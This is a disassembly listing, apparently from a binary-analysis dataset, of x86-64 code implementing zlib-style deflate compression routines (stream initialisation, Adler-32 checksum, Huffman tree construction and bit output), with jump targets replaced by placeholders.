add [ rbx + 0x94 ] ebp
add [ rbx + 0x9c ] 0xffffffff
cmp [ rax + 0x18 ] edi
jne r-xdata
mov eax [ rbx + 0x84 ]
test eax eax
js r-xdata
movzx eax r8w
shr rax 0x7
movzx ecx [ rax + r14 + 0x17800 ]
movzx eax r8w
movzx ecx [ rax + r14 + 0x17700 ]
jmp r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x3
je r-xdata
mov eax 0x3
cmp r12d 0x4
cmove ebp eax
mov eax ebp
jmp r-xdata
cmp r12d 0x4
cmove edi r13d
mov eax edi
jmp r-xdata
mov r8d [ rbx + 0x94 ]
mov r9d edi
cmp r12d 0x4
sete r9b
sub r8d eax
mov rcx rbx
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
jmp r-xdata
mov rdx rdi
mov rdx rax
add rdx [ rbx + 0x50 ]
jmp r-xdata
add [ rbx + 0xa0 ] 0xffffffff
jne r-xdata
mov rax [ rbx + 0x50 ]
mov rdx [ rbx + 0x68 ]
lea ecx [ r8 + 0x2 ]
movzx r9d [ rcx + rax ]
mov eax [ rbx + 0x70 ]
mov ecx [ rbx + 0x80 ]
shl eax cl
mov rcx [ rbx + 0x60 ]
xor r9d eax
mov eax [ rbx + 0x4c ]
and r9d [ rbx + 0x7c ]
and r8 rax
mov [ rbx + 0x70 ] r9d
movzx eax [ rdx + r9 * 2 ]
mov [ rcx + r8 * 2 ] ax
mov eax [ rbx + 0x4c ]
mov ecx [ rbx + 0x94 ]
mov edx [ rbx + 0x70 ]
and rcx rax
mov rax [ rbx + 0x60 ]
movzx esi [ rax + rcx * 2 ]
mov rcx [ rbx + 0x68 ]
movzx eax [ rbx + 0x94 ]
mov [ rcx + rdx * 2 ] ax
movsxd rax ecx
mov r11d edi
add [ rbx + rax * 4 + 0x9b0 ] bp
mov ecx [ rbx + 0xa0 ]
mov eax [ rbx + 0x16f0 ]
sub eax ebp
cmp [ rbx + 0x16f4 ] eax
mov eax ebp
sete r11b
sub eax ecx
add [ rbx + 0x9c ] eax
lea eax [ rcx - 0x2 ]
mov [ rbx + 0xa0 ] eax
nop
nop
nop
nop
mov eax [ rbx + 0x88 ]
cmp eax 0x5
ja r-xdata
cmp ecx ebp
jne r-xdata
mov edx esi
mov rcx rbx
call sub_100122f0
mov [ rbx + 0x88 ] eax
jmp r-xdata
mov r14 [ rsp + 0x20 ]
mov r13 [ rsp + 0x28 ]
mov r12 [ rsp + 0x30 ]
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
mov r8d [ rbx + 0x94 ]
xor r9d r9d
mov rcx rbx
sub r8d eax
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
add [ rbx + 0x94 ] ebp
mov r8d [ rbx + 0x94 ]
cmp r8d r10d
ja r-xdata
add [ rbx + 0x94 ] ebp
test r11d r11d
mov r8d [ rbx + 0x94 ]
mov [ rbx + 0x90 ] edi
mov [ rbx + 0x88 ] r13d
je r-xdata
cmp [ rbx + 0xb0 ] ebp
je r-xdata
mov edx esi
mov rcx rbx
call sub_100124d0
mov [ rbx + 0x88 ] eax
mov eax [ rbx + 0x84 ]
test eax eax
js r-xdata
mov [ rbx + 0x88 ] r13d
cmp eax 0x3
jne r-xdata
mov rdx rdi
mov rdx rax
add rdx [ rbx + 0x50 ]
jmp r-xdata
mov eax [ rbx + 0x94 ]
sub eax [ rbx + 0x98 ]
cmp eax 0x1000
jbe r-xdata
sub r8d eax
xor r9d r9d
mov rcx rbx
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
sub_10013230
sub rsp 0x28
test rcx rcx
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x48 ] rdi
mov rbx rcx
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x38 ]
mov eax 0xfffffffe
add rsp 0x28
retn
mov rdi [ rcx + 0x28 ]
test rdi rdi
je r-xdata
cmp [ rcx + 0x30 ] 0x0
je r-xdata
cmp [ rcx + 0x38 ] 0x0
je r-xdata
mov [ rcx + 0x48 ] 0x2
mov [ rsp + 0x40 ] rsi
xor esi esi
mov [ rcx + 0x1c ] esi
mov [ rcx + 0xc ] esi
mov [ rcx + 0x20 ] rsi
mov rax [ rdi + 0x10 ]
mov [ rdi + 0x28 ] esi
mov [ rdi + 0x20 ] rax
mov eax [ rdi + 0x2c ]
test eax eax
jns r-xdata
mov ecx [ rdi + 0x2c ]
mov eax 0x71
mov edx 0x2a
test ecx ecx
cmovne eax edx
cmp ecx 0x2
mov [ rdi + 0x8 ] eax
jne r-xdata
neg eax
mov [ rdi + 0x2c ] eax
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_100135f0
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_10015a70
jmp r-xdata
mov [ rbx + 0x4c ] eax
mov rcx rdi
mov [ rdi + 0x40 ] esi
call sub_10014dd0
mov rcx rdi
call sub_10012240
mov rsi [ rsp + 0x40 ]
xor eax eax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
sub_10013310
sub rsp 0x68
mov rax [ rsp + 0xa0 ]
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x58 ] rbp
test rax rax
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r14
mov r14d 0x1
mov edi r9d
mov ebp edx
mov rbx rcx
mov r13d r14d
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
cmp [ rax ] 0x31
jne r-xdata
mov r14 [ rsp + 0x30 ]
mov r13 [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbp [ rsp + 0x58 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x68
retn
cmp [ rsp + 0xa8 ] 0x58
jne r-xdata
test rcx rcx
jne r-xdata
xor ecx ecx
cmp [ rbx + 0x30 ] rcx
mov [ rbx + 0x20 ] rcx
jne r-xdata
lea eax [ rcx - 0x2 ]
jmp r-xdata
cmp [ rbx + 0x38 ] rcx
jne r-xdata
lea rax [ sub_10015a80 ]
mov [ rbx + 0x40 ] rcx
mov [ rbx + 0x30 ] rax
cmp edx 0xffffffff
mov eax 0x6
cmove ebp eax
test r9d r9d
jns r-xdata
lea rax [ sub_10015a90 ]
mov [ rbx + 0x38 ] rax
cmp r9d 0xf
jle r-xdata
mov r13d ecx
neg edi
jmp r-xdata
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x28 ] r15
mov r15d [ rsp + 0x90 ]
lea eax [ r15 - 0x1 ]
cmp eax 0x8
ja r-xdata
mov r13d 0x2
sub edi 0x10
mov eax 0xfffffffe
jmp r-xdata
cmp r8d 0x8
jne r-xdata
mov r12 [ rsp + 0x40 ]
mov r15 [ rsp + 0x28 ]
lea eax [ rdi - 0x8 ]
cmp eax 0x7
ja r-xdata
cmp ebp 0x9
ja r-xdata
mov r12d [ rsp + 0x98 ]
cmp r12d 0x4
ja r-xdata
mov rcx [ rbx + 0x40 ]
cmp edi r8d
mov eax 0x9
mov r8d 0x1718
mov edx r14d
mov [ rsp + 0x50 ] rsi
cmove edi eax
call [ rbx + 0x30 ]
test rax rax
mov rsi rax
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov [ rbx + 0x28 ] rax
mov [ rax ] rbx
mov [ rax + 0x2c ] r13d
mov [ rax + 0x30 ] 0x0
mov [ rax + 0x48 ] edi
mov ecx edi
mov r9d r14d
mov r8d 0x2
shl r9d cl
lea ecx [ r15 + 0x7 ]
mov [ rax + 0x44 ] r9d
lea eax [ r9 - 0x1 ]
mov [ rsi + 0x78 ] ecx
mov [ rsi + 0x4c ] eax
mov eax r14d
shl eax cl
add ecx 0x2
mov [ rsi + 0x74 ] eax
add eax 0xffffffff
mov [ rsi + 0x7c ] eax
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
mov [ rsi + 0x80 ] edx
mov rcx [ rbx + 0x40 ]
mov edx r9d
call [ rbx + 0x30 ]
mov edx [ rsi + 0x44 ]
mov r8d 0x2
mov [ rsi + 0x50 ] rax
mov rcx [ rbx + 0x40 ]
call [ rbx + 0x30 ]
mov edx [ rsi + 0x74 ]
mov r8d 0x2
mov [ rsi + 0x60 ] rax
mov rcx [ rbx + 0x40 ]
call [ rbx + 0x30 ]
lea ecx [ r15 + 0x6 ]
mov r8d 0x4
shl r14d cl
mov [ rsi + 0x68 ] rax
mov [ rsi + 0x16f0 ] r14d
mov rcx [ rbx + 0x40 ]
mov edx r14d
call [ rbx + 0x30 ]
cmp [ rsi + 0x50 ] 0x0
mov r11 rax
mov [ rsi + 0x10 ] rax
mov eax [ rsi + 0x16f0 ]
lea ecx [ rax * 4 ]
mov [ rsi + 0x18 ] ecx
je r-xdata
mov rsi [ rsp + 0x50 ]
mov [ rsi + 0x8 ] 0x29a
mov rax [ r--data ]
mov rcx rbx
mov [ rbx + 0x20 ] rax
call sub_100120a0
cmp [ rsi + 0x60 ] 0x0
je r-xdata
cmp [ rsi + 0x68 ] 0x0
je r-xdata
test r11 r11
je r-xdata
mov rcx rax
shr rax 0x1
mov [ rsi + 0xac ] ebp
lea rax [ r11 + rax * 2 ]
mov [ rsi + 0xb0 ] r12d
mov [ rsi + 0x3c ] 0x8
mov [ rsi + 0x16f8 ] rax
lea rax [ r11 + rcx * 2 ]
add rcx rax
mov [ rsi + 0x16e8 ] rcx
mov rcx rbx
call sub_10013230
sub_100135f0
push rbx
mov r10d ecx
mov r11 rdx
movzx r9d cx
shr r10d 0x10
cmp r8d 0x1
jne r-xdata
test rdx rdx
jne r-xdata
movzx eax [ rdx ]
add r9d eax
cmp r9d 0xfff1
jb r-xdata
cmp r8d 0x10
jae r-xdata
lea eax [ rdx + 0x1 ]
pop rbx
retn
add r10d r9d
cmp r10d 0xfff1
jb r-xdata
add r9d 0xffff000f
cmp r8d 0x15b0
jb r-xdata
test r8d r8d
je r-xdata
shl r10d 0x10
or r10d r9d
mov eax r10d
pop rbx
retn
add r10d 0xffff000f
shl r10d 0x10
or r10d r9d
mov eax r10d
pop rbx
retn
test r8d r8d
je r-xdata
mov eax 0x5e6ea9af
mul r8d
shr edx 0xb
mov ebx edx
nop
nop
cmp r9d 0xfff1
jb r-xdata
nop
nop
nop
cmp r8d 0x10
jb r-xdata
movzx eax [ r11 ]
add r11 0x10
add r9d eax
movzx eax [ r11 - 0xf ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xe ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xd ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xc ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xb ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xa ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x9 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x8 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x7 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x6 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x5 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x4 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x3 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x2 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x1 ]
add r10d r9d
add r9d eax
add r10d r9d
add ecx 0xffffffff
jne r-xdata
mov eax 0x80078071
mul r9d
mov eax 0x80078071
shr edx 0xf
imul edx edx 0xffff000f
add r9d edx
mul r10d
shr edx 0xf
imul edx edx 0xffff000f
add r10d edx
sub rbx 0x1
jne r-xdata
mov eax 0x80078071
mul r10d
shr edx 0xf
imul edx edx 0xf
lea eax [ r10 + rdx ]
shl eax 0x10
or eax r9d
pop rbx
retn
add r9d 0xffff000f
movzx eax [ r11 ]
add r11 0x1
add r9d eax
add r10d r9d
add r8d 0xffffffff
jne r-xdata
test r8d r8d
je r-xdata
mov ecx r8d
shr rcx 0x4
nop
nop
add r8d 0xffffea50
mov ecx 0x15b
nop
mov eax 0x80078071
mul r9d
mov eax 0x80078071
shr edx 0xf
imul edx edx 0xffff000f
add r9d edx
mul r10d
shr edx 0xf
imul edx edx 0xffff000f
add r10d edx
nop
nop
nop
movzx eax [ r11 ]
add r8d 0xfffffff0
add r11 0x10
add r9d eax
movzx eax [ r11 - 0xf ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xe ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xd ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xc ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xb ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0xa ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x9 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x8 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x7 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x6 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x5 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x4 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x3 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x2 ]
add r10d r9d
add r9d eax
movzx eax [ r11 - 0x1 ]
add r10d r9d
add r9d eax
add r10d r9d
sub rcx 0x1
jne r-xdata
movzx eax [ r11 ]
add r11 0x1
add r9d eax
add r10d r9d
add r8d 0xffffffff
jne r-xdata
sub_10013900
mov r8 rcx
lea rax [ rcx + 0xbc ]
mov edx 0x11e
nop
mov [ rax ] 0x0
add rax 0x4
sub rdx 0x1
jne r-xdata
lea rax [ rcx + 0x9b0 ]
mov edx 0x1e
nop
nop
mov [ rax ] 0x0
add rax 0x4
sub rdx 0x1
jne r-xdata
lea rax [ rcx + 0xaa4 ]
mov ecx 0x13
nop
nop
mov [ rax ] 0x0
add rax 0x4
sub rcx 0x1
jne r-xdata
xor eax eax
mov [ r8 + 0x4bc ] 0x1
mov [ r8 + 0x1704 ] eax
mov [ r8 + 0x1700 ] eax
mov [ r8 + 0x1708 ] eax
mov [ r8 + 0x16f4 ] eax
retn
sub_10013990
mov eax [ rcx + 0x149c ]
mov [ rsp + 0x10 ] rbx
movsxd r11 r8d
movsxd rbx [ rcx + r11 * 4 + 0xba8 ]
lea r9d [ r11 + r11 ]
mov [ rsp + 0x18 ] rsi
cmp r9d eax
mov [ rsp + 0x20 ] rdi
mov rdi rdx
jg r-xdata
mov [ rcx + r11 * 4 + 0xba8 ] ebx
mov rdi [ rsp + 0x20 ]
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
retn
cmp r9d eax
jge r-xdata
movsxd rax r9d
movsxd r10 [ rcx + rax * 4 + 0xba8 ]
movzx eax [ rdi + rbx * 4 ]
movzx edx [ rdi + r10 * 4 ]
cmp ax dx
jb r-xdata
movsxd rax r9d
movsxd r10 [ rcx + rax * 4 + 0xba8 ]
movsxd r8 [ rcx + rax * 4 + 0xbac ]
movzx eax [ rdi + r8 * 4 ]
movzx edx [ rdi + r10 * 4 ]
cmp ax dx
jb r-xdata
mov rdi [ rsp + 0x20 ]
mov rsi [ rsp + 0x18 ]
movsxd rax r11d
mov [ rcx + rax * 4 + 0xba8 ] ebx
mov rbx [ rsp + 0x10 ]
retn
cmp ax dx
jne r-xdata
add r9d 0x1
cmp ax dx
jne r-xdata
movsxd rax r11d
movsxd r11 r9d
add r9d r9d
mov [ rcx + rax * 4 + 0xba8 ] r10d
mov eax [ rcx + 0x149c ]
cmp r9d eax
jle r-xdata
movzx eax [ r10 + rcx + 0x14a4 ]
cmp [ rbx + rcx + 0x14a4 ] al
jbe r-xdata
movzx eax [ r10 + rcx + 0x14a4 ]
cmp [ r8 + rcx + 0x14a4 ] al
ja r-xdata
sub_10013a90
sub rsp 0x38
mov rax [ rdx + 0x10 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov r9d [ rax + 0x10 ]
movsxd r11 [ rax + 0x18 ]
mov esi [ rdx + 0x8 ]
mov [ rsp + 0x58 ] rdi
mov rdi [ rdx ]
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r14
mov r14 [ rax ]
mov r8 rcx
mov [ rsp + 0x18 ] r15
mov r15 [ rax + 0x8 ]
xor eax eax
mov [ rcx + 0xb88 ] rax
mov [ rcx + 0xb90 ] rax
mov [ rcx + 0xb98 ] rax
mov [ rcx + 0xba0 ] rax
mov edx eax
movsxd rax [ rcx + 0x14a0 ]
movsxd rcx [ rcx + rax * 4 + 0xba8 ]
mov r13d 0x23d
mov [ rsp ] r9d
mov [ rdi + rcx * 4 + 0x2 ] dx
mov ebx [ r8 + 0x14a0 ]
add ebx 0x1
movsxd rax ebx
cmp rax r13
jge r-xdata
test edx edx
mov r15 [ rsp + 0x18 ]
mov r14 [ rsp + 0x20 ]
mov r13 [ rsp + 0x28 ]
je r-xdata
mov [ rsp + 0x30 ] r12
sub r13 rax
lea r12 [ r8 + rax * 4 + 0xba8 ]
add ebx r13d
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x4 ] ebx
nop
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
lea r10d [ r11 - 0x1 ]
nop
nop
nop
cmp ebp esi
mov [ rbx + rdi + 0x2 ] cx
jg r-xdata
mov ecx r11d
add edx 0x1
movsxd rax ecx
sub edx 0x2
add [ r8 + rax * 2 + 0xb88 ] 0xffff
add [ r8 + rax * 2 + 0xb8a ] 0x2
add [ r8 + r11 * 2 + 0xb88 ] 0xffff
test edx edx
jg r-xdata
nop
add r12 0x4
sub r13 0x1
jne r-xdata
movsxd rax ecx
xor r9d r9d
add [ r8 + rax * 2 + 0xb88 ] 0x1
cmp ebp [ rsp ]
jl r-xdata
movsxd rcx r10d
cmp [ r8 + rcx * 2 + 0xb88 ] 0x0
jne r-xdata
test r11d r11d
movsxd rbx ebx
je r-xdata
sub ecx 0x1
movsxd rax ecx
cmp [ r8 + rax * 2 + 0xb88 ] 0x0
je r-xdata
movsxd rbp [ r12 ]
mov r10 rbp
lea rbx [ rbp * 4 ]
movzx eax [ rbx + rdi + 0x2 ]
movzx ecx [ rdi + rax * 4 + 0x2 ]
add ecx 0x1
cmp ecx r11d
jle r-xdata
mov ebx [ rsp + 0x4 ]
mov r12 [ rsp + 0x30 ]
mov rbp [ rsp + 0x48 ]
movzx r10d [ rbx + rdi ]
lea eax [ r9 + rcx ]
imul eax r10d
add [ r8 + 0x1700 ] eax
test r14 r14
je r-xdata
movsxd r9 [ rsp ]
sub r10 r9
mov r9d [ r15 + r10 * 4 ]
nop
nop
nop
movzx eax [ rbx + r14 + 0x2 ]
add eax r9d
imul eax r10d
add [ r8 + 0x1704 ] eax
sub r11d 0x1
jne r-xdata
lea r9 [ r8 + rbx * 4 + 0xba8 ]
nop
nop
movsxd rax r11d
movzx edx [ r8 + rax * 2 + 0xb88 ]
test edx edx
je r-xdata
test edx edx
jne r-xdata
mov r10 rax
movzx eax [ rdi + rax * 4 + 0x2 ]
cmp eax r11d
je r-xdata
movsxd rax [ r9 - 0x4 ]
sub r9 0x4
sub rbx 0x1
cmp eax esi
jg r-xdata
sub edx 0x1
mov ecx r11d
sub ecx eax
movzx eax [ rdi + r10 * 4 ]
imul ecx eax
add [ r8 + 0x1700 ] ecx
mov [ rdi + r10 * 4 + 0x2 ] r11w
sub_10013ce0
mov [ rsp + 0x18 ] rbx
mov ebx 0xffffffff
mov [ rsp + 0x20 ] rdi
movzx edi [ rdx + 0x2 ]
xor r10d r10d
mov r11 rdx
test edi edi
lea eax [ rbx + 0x8 ]
lea r9d [ rbx + 0x5 ]
jne r-xdata
test r8d r8d
movsxd rdx r8d
mov [ r11 + rdx * 4 + 0x6 ] 0xffff
js r-xdata
mov eax 0x8a
lea r9d [ rbx + 0x4 ]
mov rdi [ rsp + 0x20 ]
mov rbx [ rsp + 0x18 ]
retn
add r11 0x6
lea r8 [ rdx + 0x1 ]
nop
nop
cmp r10d r9d
jge r-xdata
cmp edx edi
je r-xdata
test edx edx
je r-xdata
add [ rcx + rdx * 4 + 0xaa4 ] r10w
jmp r-xdata
add r11 0x4
sub r8 0x1
jne r-xdata
cmp r10d 0xa
jg r-xdata
cmp edx ebx
je r-xdata
xor r10d r10d
test edi edi
mov ebx edx
jne r-xdata
add r10d 0x1
movsxd rdx edi
movzx edi [ r11 ]
cmp r10d eax
jge r-xdata
add [ rcx + 0xaec ] 0x1
add [ rcx + 0xae8 ] 0x1
jmp r-xdata
add [ rcx + 0xae4 ] 0x1
jmp r-xdata
add [ rcx + rdx * 4 + 0xaa4 ] 0x1
cmp edx edi
jne r-xdata
mov eax 0x8a
lea r9d [ r10 + 0x3 ]
jmp r-xdata
mov eax 0x7
lea r9d [ rax - 0x3 ]
mov eax 0x6
lea r9d [ rax - 0x3 ]
jmp r-xdata
sub_10013dd0
sub rsp 0x8
mov [ rsp + 0x10 ] rbx
mov r11d 0xffffffff
mov [ rsp + 0x20 ] rsi
movzx esi [ rdx + 0x2 ]
lea eax [ r11 + 0x8 ]
xor r10d r10d
test esi esi
mov r9 rcx
movsxd rbx r8d
lea ecx [ rax - 0x3 ]
jne r-xdata
test r8d r8d
js r-xdata
mov eax 0x8a
lea ecx [ rsi + 0x3 ]
mov rsi [ rsp + 0x20 ]
mov rbx [ rsp + 0x10 ]
add rsp 0x8
retn
mov [ rsp + 0x18 ] rbp
mov [ rsp ] r12
lea r12 [ rbx + 0x1 ]
mov [ rsp + 0x28 ] rdi
lea rbp [ rdx + 0x6 ]
nop
nop
nop
nop
cmp r10d ecx
jge r-xdata
cmp edi esi
je r-xdata
test edi edi
je r-xdata
nop
nop
nop
nop
add rbp 0x4
sub r12 0x1
jne r-xdata
cmp r10d 0xa
jg r-xdata
cmp edi r11d
je r-xdata
movzx eax [ r9 + rdi * 4 + 0xaa4 ]
shl ax cl
or [ r9 + 0x1710 ] ax
lea eax [ rcx + r11 ]
mov [ r9 + 0x1714 ] eax
movzx r8d [ r9 + rdi * 4 + 0xaa4 ]
mov edx [ r9 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
add r10d 0x1
movsxd rdi esi
movzx esi [ rbp ]
cmp r10d eax
jge r-xdata
mov r12 [ rsp ]
mov rdi [ rsp + 0x28 ]
mov rbp [ rsp + 0x18 ]
movzx r11d [ r9 + 0xaee ]
mov ecx [ r9 + 0x1714 ]
mov eax 0x10
sub eax r11d
cmp ecx eax
jle r-xdata
movzx r11d [ r9 + 0xaea ]
mov ecx [ r9 + 0x1714 ]
mov eax 0x10
sub eax r11d
cmp ecx eax
jle r-xdata
movzx r11d [ r9 + 0xae6 ]
mov ecx [ r9 + 0x1714 ]
mov eax 0x10
sub eax r11d
cmp ecx eax
jle r-xdata
movzx r11d [ r9 + rdi * 4 + 0xaa6 ]
mov ecx [ r9 + 0x1714 ]
mov eax 0x10
sub eax r11d
cmp ecx eax
jle r-xdata
movzx r11d [ r9 + rdi * 4 + 0xaa6 ]
mov ecx [ r9 + 0x1714 ]
mov eax 0x10
sub eax r11d
cmp ecx eax
jle r-xdata
jmp r-xdata
sub r10d 0x1
jne r-xdata
movzx eax [ r9 + 0xaec ]
shl ax cl
or [ r9 + 0x1710 ] ax
lea eax [ rcx + r11 ]
mov [ r9 + 0x1714 ] eax
mov edx [ r9 + 0x28 ]
movzx r8d [ r9 + 0xaec ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
movzx eax [ r9 + 0xae8 ]
shl ax cl
or [ r9 + 0x1710 ] ax
lea eax [ rcx + r11 ]
mov [ r9 + 0x1714 ] eax
mov edx [ r9 + 0x28 ]
movzx r8d [ r9 + 0xae8 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
movzx eax [ r9 + 0xae4 ]
shl ax cl
or [ r9 + 0x1710 ] ax
lea eax [ rcx + r11 ]
mov [ r9 + 0x1714 ] eax
mov edx [ r9 + 0x28 ]
movzx r8d [ r9 + 0xae4 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
movzx eax [ r9 + rdi * 4 + 0xaa4 ]
shl ax cl
or [ r9 + 0x1710 ] ax
lea eax [ rcx + r11 ]
mov [ r9 + 0x1714 ] eax
movzx r8d [ r9 + rdi * 4 + 0xaa4 ]
mov edx [ r9 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx + r11 - 0x10 ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
xor r10d r10d
test esi esi
mov r11d edi
jne r-xdata
sub r10w 0xb
lea eax [ rcx + 0x7 ]
shl r10w cl
mov [ r9 + 0x1714 ] eax
or [ r9 + 0x1710 ] r10w
mov edx [ r9 + 0x28 ]
lea r8d [ r10 - 0xb ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0x9 ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
mov ecx [ r9 + 0x1714 ]
cmp ecx 0x9
jle r-xdata
sub r10w 0x3
lea eax [ rcx + 0x3 ]
shl r10w cl
mov [ r9 + 0x1714 ] eax
or [ r9 + 0x1710 ] r10w
jmp r-xdata
mov edx [ r9 + 0x28 ]
lea r8d [ r10 - 0x3 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0xd ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
mov ecx [ r9 + 0x1714 ]
cmp ecx 0xd
jle r-xdata
sub r10w 0x3
lea eax [ rcx + 0x2 ]
shl r10w cl
